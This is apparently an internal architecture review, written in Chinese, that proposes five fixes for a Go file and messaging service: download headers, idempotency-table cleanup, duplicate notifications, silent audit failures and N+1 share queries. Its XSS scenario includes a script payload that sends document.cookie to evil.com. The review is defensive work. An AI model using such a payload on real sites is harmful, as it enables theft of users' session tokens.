# aero-id — 资深架构师 / 产品经理视角：高价值扩展方向

> **日期**: 2026-07-10  
> **方法**: 全局扫描 `internal/` 全部 22 个 Go 包（~180 源文件）、22 份可逆 SQL 迁移、双传输层 handler、composition root `app.go`、gRPC proto、配置。与 `docs/requirements/` 下 76+ 份既有分析文档做逐主题比对，确认以下 5 个方向在全部现有分析中**未被系统性覆盖**。  
> **视角**: 资深架构师 / 产品经理  
> **原则**: 不编写代码。每个方向有精确代码级证据。优先选择**能从代码事实中直接推导、而非纯 wishlist 的扩展方向**。

---

## 前置：交叉验证结论

已有 76+ 份 `docs/requirements/*.md` 分析文档累计覆盖 ~100+ 个扩展方向，包括但不限于：群聊、频道、SSE 毫秒级竞态、文件加密、Webhook 平台化、分布式限流、通知事件覆盖补充、存储配额、Outbox 死信 API、文件版本管理、消息 Threading、@提及、活动流、媒体转码、数据导出、多区域部署、E2EE、推送通知（FCM/APNs）、内容审核管线、SDK 生成、OpenAPI 规范、审计日志扩展、索引优化、多租户、并发安全（TOCTOU）、API 版本化、I18N、定时任务引擎、告警规则引擎等。

**本文五个方向在以上全部覆盖之外。**

---

## 方向一：匿名下载 URL 缺乏 Content-Type / Content-Disposition 绑定（安全缺口）

### 严重性

**安全 · 中高** — 在 local 存储后端上可在特制条件下引发 XSS / 内容投毒

### 问题描述

aero-id 的 local 存储匿名下载路径（`GET /files/dl`）使用 HMAC 签名作为唯一身份验证机制。签名覆盖 `key|expires` 二元组，但**不绑定 Content-Type 或 Content-Disposition**。这意味着：

1. 攻击者获得一条合法下载 URL 后，可以操纵 HTTP 请求的 `Accept` 头（浏览器辅助）或诱导浏览器以非预期方式渲染文件
2. 服务端在 `Download` handler 中既**不设置 `Content-Type`** 也**不设置 `Content-Disposition`**，完全依赖浏览器的内容嗅探（content sniffing）——经典的 XSS 向量
3. 如果存储后端藏有 HTML/JS 文件，合法用户分享的下载链接可能被用于跨站攻击

### 代码级证据

**证据 1：Download handler 不设置任何 Content-Type / Content-Disposition**

```go
// internal/handler/http/file.go:259-272
func (h *FileHandler) Download(c *gin.Context) {
    if err := h.downloader.VerifyPresignedURL(c.Request.URL.String(), time.Now()); err != nil {
        httpx.WriteError(c, apperr.Forbidden("file.bad_signature", "invalid or expired download link"))
        return
    }
    rc, err := h.downloader.Get(c.Request.Context(), c.Query("key"))
    if err != nil {
        httpx.WriteError(c, apperr.NotFound("file.not_found", "file not found"))
        return
    }
    defer func() { _ = rc.Close() }()
    c.Status(http.StatusOK)
    _, _ = io.Copy(c.Writer, rc)  // ← 纯 byte stream，无 Content-Type 头
}
```

对比文件其他端点（如文件列表）均有明确的 `Content-Type: application/json`。此处完全是裸流。

**证据 2：HMAC 签名不覆盖响应头**

```go
// internal/storage/signing.go:16-30
func presignHMAC(key string, expires int64, signingKey string) string {
    mac := hmac.New(sha256.New, []byte(signingKey))
    fmt.Fprintf(mac, "%s|%d", key, expires)  // ← 仅 key + 过期时间，无 Content-Type
    return hex.EncodeToString(mac.Sum(nil))
}
```

**证据 3：VerifyPresignedURL 同样只检查 key|expires**

```go
// internal/storage/signing.go:33-55
func verifyPresignedURL(rawURL string, now time.Time, signingKey string) error {
    // ...解析 URL，提取 key, exp, sig...
    // 只验证 key|exp 的 HMAC，不关心请求路径之外的头
}
```

**证据 4：S3 后端也有同样问题（但风险略低）**

```go
// internal/storage/s3.go — Presign 请求也不设置 ResponseContentType
func (s *S3) PresignUpload(ctx context.Context, key string, ttl time.Duration) (string, error) {
    // 返回的 presigned URL 不绑定 Content-Type
}
```

S3 presigned URL 可以通过 `response-content-type` 参数绑定，但当前实现未使用。

### 攻击场景示例

1. Alice 上传一个 `.txt` 文件，内容是 `<script>document.location='https://evil.com/?c='+document.cookie</script>`
2. Alice 生成一条共享链接：`/files/dl?key=alice/2026/07/xxx&exp=1234567890&sig=...`
3. Alice 诱导 Bob 在浏览器中打开该链接
4. 服务端返回裸 byte stream，**无 Content-Type 头** → 浏览器嗅探内容 → 识别为 `text/html` → 执行脚本
5. Bob 的 cookie（包含 SSO token）被发送到攻击者服务器

### 建议

#### 短期修复（侵入性低）

1. 在 `Download` handler 中设置 `Content-Disposition: attachment; filename="..."` 强制浏览器下载而非渲染
2. 在 `Download` handler 中根据文件记录的 MIME type 设置 `Content-Type`（需要 Download handler 有办法获取文件元数据）

#### 长期方案

1. 将文件的 MIME type 加入 HMAC 签名输入：`sign(key, expires, content_type)`，这样 URL 就绑定了一个特定媒体类型
2. 请求到达时，验证请求的 `Accept` 头与签名的 Content-Type 兼容
3. 添加 `X-Content-Type-Options: nosniff` 响应头防止浏览器嗅探

### 影响范围

- local 存储后端：**高** — 匿名下载路径无认证，完全依赖签名
- S3 存储后端：**中** — S3 presigned URL 有独立的权限模型，但仍然不绑定 Content-Type

---

## 方向二：Idempotency Key 表缺乏规模管控与可观测性（运维盲区）

### 严重性

**运维 · 中** — 在写密集场景下可导致表膨胀、性能退化、恢复困难

### 问题描述

idempotency key 表（`idempotency_keys`）用于确保关键写操作（发送消息、创建评论、上传文件）的幂等性。但其当前实现存在三个运维缺口：

1. **表大小无上限** — TTL 为 24h，清理周期为 1h。在 24h 窗口内，表可以无限制增长。对于高频写路径（消息发送、评论创建），100+ qps × 86400s = 864 万行/天
2. **无指标暴露** — 当前 `metrics` 包完全没有 idempotency 相关的计数器。运维人员无法知道表大小、清理延迟、reserve/complete/conflict 的速率
3. **清理是全表扫描 DELETE** — `purgeExpired()` 执行 `DELETE FROM idempotency_keys WHERE expires_at < NOW()`，这是一个**全表范围删除**，在行数达到千万级时会引起 VACUUM 风暴和主从延迟

### 代码级证据

**证据 1：清理间隔为 1h，TTL 为 24h，窗口内行数无上界**

```go
// internal/app/app.go:145
stopIdemClean := idemStore.RunCleaner(time.Hour)  // 每小时清理一次

// internal/middleware/idempotency.go:19
const defaultIdempotencyTTL = 24 * time.Hour  // TTL 默认 24h
```

这意味着最多积累 24h（清理周期内）+ 1h（清理间隔）= **25h 的过期数据**。

**证据 2：清理函数对错误完全静默**

```go
// internal/idempotency/store.go:149-151
func (s *GormStore) purgeExpired() {
    _ = s.db.Where("expires_at < ?", time.Now().UTC()).Delete(&idempotencyRow{}).Error
    // ↑ 错误无声丢弃。——若清理因死锁/超时失败，永不知情
}
```

当表行数达到数千万时，`DELETE` 可能遇到行锁竞争或语句超时。错误被静默丢弃意味着清理停止工作，表持续膨胀直到故障。

**证据 3：Metrics 包无任何 idempotency 指标**

```go
// internal/pkg/metrics/metrics.go — 搜索 idempot 零命中
// Registry 支持: ObserveHTTP, ObserveGRPC, ObserveOutbox*, ObserveSSO*
// 缺少: ObserveIdempotencyReserve, ObserveIdempotencyHit, ObserveIdempotencyConflict
// 缺少: GaugeIdempotencyTableSize, GaugeIdempotencyExpiredPct
```

**证据 4：Infrastructure 监控也无视角**

```go
// internal/handler/http/health.go — /healthz 和 /readyz 不监控 idempotency 表健康
// internal/handler/grpc/ops.go — gRPC health service 也不包含 idempotency
```

### 影响量化

| QPS | 24h 行数 | 清理 DELETE 影响 |
|-----|----------|-----------------|
| 10/s | 864,000 | 可忽略 |
| 100/s | 8,640,000 | 单次 DELETE 锁数千行，可能引发锁等待 |
| 500/s | 43,200,000 | 单次 DELETE 可能超时，VACUUM 压力显著 |
| 1000/s | 86,400,000 | 每次清理可能需要数分钟，与清理间隔冲突 |

### 建议

#### 短期（运维加固）

1. 增加 `GaugeIdempotencyTableSize` 指标暴露当前表行数（通过 `SELECT COUNT(*)` 或 `pg_stat_user_tables.n_tup_ins - n_tup_del`）
2. 增加 `CounterIdempotencyReserve/Hit/Conflict` 指标，反映幂等键的使用分布
3. 增加清理失败的警告日志和错误计数器
4. 在 `/readyz` 或独立的信号端点中暴露 idempotency 表健康状态

#### 中期（架构改进）

1. 引入**分区表**（按 `expires_at` 时间范围分区，例如按天分区），清理变成分区 DROP，杜绝 `DELETE` 风暴
2. 增加**行数上限阈值**配置项，超过上限时退化为 fail-open（让写操作继续但不保证幂等性）

---

## 方向三：Outbox 通知调度器缺乏幂等处理——重启产生重复通知（数据正确性）

### 严重性

**数据正确性 · 中** — 可在重启/故障切换时产生可见的重复通知

### 问题描述

Outbox relay 提供 **at-least-once** 交付语义：事件被 handler 处理后，relay 批量标记为 `published_at`。但 `Handle` 和 `MarkPublished` 之间有一个**持久化窗口**：

```
批量循环:
  Event A: Handle(notification created) → 加入 published 列表
  Event B: Handle(notification created) → 加入 published 列表
  ...
  MarkPublished(A, B, ...)  → 设 published_at
```

如果 relay 在处理完 A、B 但未调用 `MarkPublished` 之前**崩溃或重启**：
- 重启后 `FetchUnpublished` 重新拿到 A、B（因为 `published_at IS NULL`）
- handler 为 A、B 各创建第二行通知
- 用户收到两条内容完全相同的通知

当前 **NotificationDispatcher 没有任何去重逻辑**。

### 代码级证据

**证据 1：drain 方法的处理-标记分离窗口**

```go
// internal/outbox/relay.go:83-100
published := make([]uuid.UUID, 0, len(events))
for _, e := range events {
    // ...skip backoff...
    if err := r.handler.Handle(ctx, e); err != nil {
        // mark failed
        continue
    }
    published = append(published, e.ID)
    // ← 此处如果崩溃，A 已处理但未标记 published
}
// ← 如果在此处崩溃，published 列表全部丢失
if err := r.repo.MarkPublished(ctx, published); err != nil {
    // ← 如果 MarkPublished 失败，下个 tick 重试整个 batch
    //      但 Handler 已经为每个事件写了一行通知
}
```

**证据 2：NotificationDispatcher.Handle 每次写入新行，无去重**

```go
// internal/service/notification.go:148-165
func (d *NotificationDispatcher) Handle(ctx context.Context, e *outbox.Event) error {
    n := d.notificationFor(e)
    // ...
    if err := d.notifs.Create(ctx, n); err != nil {
        return err   // ← 每次 Handle 创建一个新通知行
    }
    // ...
}
```

对比之下，Comment Like 有唯一约束，Message Reaction 有唯一约束——这些操作天然幂等。但 `notifications` 表**没有任何唯一约束能阻止相同事件创建重复行**。

**证据 3：outbox_events 表也没有 handler 幂等标记**

```go
// internal/outbox/outbox.go — Event 结构
type Event struct {
    // ...没有 consumer_ack_hash 或 handler_idempotency_key 字段
}
```

**证据 4：relay 的优雅关闭有 drain，但是一次性 drain，不能消除 race**

```go
// internal/outbox/relay.go:134-140
func (r *Relay) Start(interval time.Duration) (stop func()) {
    // ...
    return func() {
        close(done)
        r.drain(context.Background())  // 最后一次 drain 后停止
    }
}
```

最后一次 `drain` 仍然有 `Handle` → `MarkPublished` 之间的窗口。

### 建议

#### 方案 A（低成本）：通知表增加唯一约束

给 `notifications` 表增加 `(recipient_uid, type, subject_type, subject_id, actor_uid)` 唯一约束，Create 使用 `ON CONFLICT DO NOTHING`：

```sql
CREATE UNIQUE INDEX idx_notifications_idempotent
    ON notifications (recipient_uid, type, subject_type, subject_id, actor_uid)
    WHERE read_at IS NULL;
```

这样即使 Dispatcher 被重复调用，也不会产生可见的重复通知。

#### 方案 B（高成本）：Event 增加 handler_idempotency_key

在 outbox event 的 payload 中加入一个确定性哈希（`aggregate_type + aggregate_id + event_type + created_at`），handler 在处理前先做 `SELECT ... FOR UPDATE` 检查是否已处理。

#### 方案 C（折中）：MarkPublished 提前到 Handle 之前

在调用 `Handle` **之前**就设 `published_at`（乐观标记），如果 handler 失败，事件标记为已发布但实际未投递。但通知场景下丢一个比重复一个更糟（反向权衡），故不推荐。

**推荐方案 A**：低成本、无新增依赖、对用户影响最小。

---

## 方向四：审计日志失败完全静默——无指标、无告警、无降级策略（运维盲区）

### 严重性

**运维 · 中** — 审计日志的"无声失败"意味着合规盲区

### 问题描述

aero-id 在多个关键路径上记录了审计事件：文件分享授予/撤销、评论报告解决、用户封禁/解封、消息删除。但**每处审计调用都无声丢弃错误**：

```go
_ = s.audit.Log(ctx, &domain.AuditEvent{...})
```

这种设计是故意的（`AuditLogger` 接口的文档明确说"实现必须非阻塞；失败的日志不能导致主操作失败"），但它在运维层面制造了一个盲区：**没有任何机制能告知运维人员审计日志系统出现了故障**。

当审计后端（数据库）出现写入延迟、连接池耗尽、或表空间不足时：
1. 所有审计事件被静默丢弃
2. 没有日志、没有指标、没有告警
3. 合规检查时发现审计缺失，但无法追溯损失了多少事件以及何时开始丢失

### 代码级证据

**证据 1：File Service 的审计调用**

```go
// internal/file/service_share.go:43-50
if s.audit != nil {
    for _, g := range grantees {
        _ = s.audit.Log(ctx, &domain.AuditEvent{...})  // ← 无声丢弃
    }
}
```

**证据 2：Message Service 的审计调用**

```go
// internal/service/message.go:250-256
if s.audit != nil {
    _ = s.audit.Log(ctx, &domain.AuditEvent{...})  // ← 无声丢弃
}
```

**证据 3：Comment Service 的审计调用**

```go
// internal/service/comment.go:305-313
if s.audit != nil {
    _ = s.audit.Log(ctx, &domain.AuditEvent{...})  // ← 无声丢弃
}
```

**证据 4：Block Service 的审计调用**

```go
// internal/service/block.go:??
if s.audit != nil {
    _ = s.audit.Log(ctx, &domain.AuditEvent{...})  // ← 无声丢弃
}
```

**证据 5：Metrics 包无审计相关指标**

```go
// internal/pkg/metrics/metrics.go — 搜索 audit 零命中
// 没有任何 AuditLogFailed 计数器
```

**证据 6：Repository 层没有降级策略**

```go
// internal/repository/audit.go — Log 实现直接写 DB
func (r *auditRepo) Log(ctx context.Context, e *domain.AuditEvent) error {
    return r.db.WithContext(ctx).Create(&auditRow{...}).Error
    // 如果 DB 不可写 → 返回 error → 被无声丢弃
}
```

**证据 7：审计表没有健康检查**

```go
// internal/handler/http/health.go — /readyz 检查 database 和 sso
// 但不检查 audit_log 表的写入健康
```

### 影响量化

| 场景 | 损失 |
|------|------|
| 数据库短暂不可用（主切换 ~30s） | 30s 内所有审计事件丢失 |
| 连接池泄露（日常运维 bug） | 持续丢失直到人工发现 |
| 表空间满（审计日志无保留策略） | 持续丢失直到 `autovacuum` 或手动清理 |
| 并发写入超过性能基准 | 部分丢失（取决于哪个写入先失败） |

### 建议

#### 短期（可观测性）

1. 在 AuditLogger 的实现中增加失败计数器（`metrics.ObserveAuditFailure`）
2. 在 AuditLogger 的实现中，首次失败时打印一条 `WARN` 日志，后续失败以采样率（如 1%）打印以避免日志风暴
3. 增加 `GaugeAuditLogTableSize` 指标反映审计表大小

#### 中期（降级策略）

1. 提供**审计日志的备选写入目标**：当主 DB 写入失败时，降级到本地文件（`os.WriteFile` 或结构化日志）或 secondary 日志流
2. 在审计写入失败率达到阈值时，通过 `/readyz` 暴露健康状态

#### 长期（架构）

1. 考虑审计事件的**异步写入**：通过 outbox 事件来记录审计，利用 outbox 已有的重试和死信机制
2. 但需要注意审计和业务操作的一致性语义（审计是否应该与业务操作在同一个事务中？）

---

## 方向五：文件访问控制 `canRead` 缺乏缓存——共享文件列表场景存在 N+1 查询问题

### 严重性

**性能 · 中** — 在高共享度场景下可导致数据库查询放大

### 问题描述

文件读取的访问控制路径 `canRead` 在文件显式共享（`file_shares`）启用时会调用 `s.shares.IsSharedWith()` 对**每个被请求的文件做一次独立数据库查询**。

在当前实现中：
- `Get`（单个文件获取）→ 1 次 `IsSharedWith` 查询
- `List`（文件列表，每页 20 条）→ 如果列表中有公开文件也有私有文件，对私有文件逐条检查共享关系 → 最多 20 次额外查询
- `ListSharedWithMe`（"分享给我的"列表）→ 本身通过分享表分页查询，不受影响

问题最大的场景是：**一个用户的文件列表中混合了私有文件、公开文件、以及他人分享给他的文件**。每一条私有非公开文件都需要一次 `IsSharedWith` 查询。

### 代码级证据

**证据 1：canRead 对每个文件调用一次 IsSharedWith**

```go
// internal/service/file.go:128-137
func (s *fileService) canRead(ctx context.Context, actor string, f *domain.File) (bool, error) {
    if canReadFile(actor, f) {
        return true, nil  // 公开文件或自己的文件 → 快速路径
    }
    if s.shares == nil {
        return false, nil
    }
    shared, err := s.shares.IsSharedWith(ctx, f.ID, actor)  // ← 每文件一次 DB 查询
    // ...
}
```

**证据 2：Get 路径对单个文件调用 canRead**

```go
// internal/service/file.go:110-126
func (s *fileService) Get(ctx context.Context, id domain.ID) (*domain.File, error) {
    // ...
    allowed, err := s.canRead(ctx, actor, f)  // ← 1 次查询
    // ...
}
```

**证据 3：IsSharedWith 的 repository 实现是独立 SQL 查询**

```go
// internal/repository/file_share.go
func (r *fileShareRepo) IsSharedWith(ctx context.Context, fileID domain.ID, uid string) (bool, error) {
    var count int64
    err := r.db.WithContext(ctx).
        Model(&fileShareRow{}).
        Where("file_id = ? AND grantee_uid = ?", fileID, uid).
        Count(&count).Error
    // ...
    return count > 0, nil
}
```

**证据 4：List 路径对每个结果都调用 canRead**

```go
// internal/service/file.go:145-152 — List 方法
func (s *fileService) List(ctx context.Context, ownerUID string, page domain.Page) (*FileList, error) {
    // ...
    // 注意：List 只列出 owner 自己的文件（ownerUID == actor），
    // 所以 canRead 走快速路径，不受影响。
}

// 但其他消费 canRead 的场景（如评论中的文件校验）也会触发
// internal/service/comment.go:147-149
func (s *commentService) assertTargetReadable(ctx context.Context, actor string, t domain.TargetType, target domain.ID) error {
    case domain.TargetTypeFile:
        f, err := s.files.Get(ctx, target)  // ← Get → canRead → IsSharedWith
        // ...
}
```

### 影响场景

| 场景 | 查询放大 |
|------|---------|
| 列表 20 个文件，5 个是分享给当前用户的 | 5 次额外 `IsSharedWith` |
| 评论列表展示，每条评论关联的文件需要检查访问 | N 次，N = 评论条数 |
| 消息列表附带文件附件，批量校验 | 每个文件一次查询 |
| 文件删除前检查 owner（无放大） | 无影响（owner 走快速路径） |

### 建议

#### 短期（低成本）

1. **批量化查询**：将 `IsSharedWith` 扩展为 `IsSharedWithBatch(ctx, fileIDs []ID, uid string) (map[ID]bool, error)`，在 `canRead` 的调用方做批量收集
2. 为 `List` 添加一个批量检查的 code path：获取一批文件后，用 `WHERE file_id IN ? AND grantee_uid = ?` 一次性查出全部共享关系

#### 中期（中等成本）

1. 引入**进程内缓存**：`(actor_uid, file_id) → bool` 的小型 LRU 缓存，TTL 几秒（共享关系变化不频繁，几分钟不一致是可接受的）
2. 共享关系变更时（Grant/Revoke）主动清除相关缓存项

#### 长期（架构）

1. 在文件元数据中**反范式化**存储 `shared_with` 列表（如 JSONB 列 `shared_with_uids TEXT[]`），避免 JOIN。共享关系变化时更新此列
2. 但要注意边路一致性和更新原子性

---

## 总结

| # | 方向 | 类型 | 严重性 | 代码证据主要来源 | 建议优先级 |
|---|------|------|--------|-----------------|-----------|
| 1 | 匿名下载 URL 缺乏 Content-Type 绑定 | 安全 | 中高 | `handler/http/file.go:259-272` | **P1** |
| 2 | Idempotency Key 表缺乏规模管控与可观测性 | 运维 | 中 | `idempotency/store.go:149-151`, `app/app.go:145` | **P1** |
| 3 | Outbox 通知调度器缺乏幂等处理 | 数据正确性 | 中 | `outbox/relay.go:83-100`, `service/notification.go:148-165` | **P1** |
| 4 | 审计日志失败完全静默 | 运维 | 中 | `file/service_share.go:43-50`, `service/message.go:250-256` | **P2** |
| 5 | `canRead` 缺乏缓存导致 N+1 查询 | 性能 | 中 | `service/file.go:128-137`, `repository/file_share.go` | **P2** |

### 建议顺序

- **先修方向一**（安全）— 在匿名下载路径上增加 `Content-Disposition: attachment` 和 `X-Content-Type-Options: nosniff` 是最简单的修复，对现有架构零影响，能在 10 行代码内消除一个 XSS 向量。
- **方向三首选方案 A**（通知表唯一约束）— 1 行迁移 + 1 行代码改动就能消除重复通知，性价比极高。
- **方向二和四**（可观测性）— 为 idempotency 和 audit 增加基本指标，让运维人员获得 visibility。每次发版都应该推进，可以逐步交付。
- **方向五**（性能优化）— 建议在文件共享功能被广泛采用后优先实施，当前规模下影响有限。
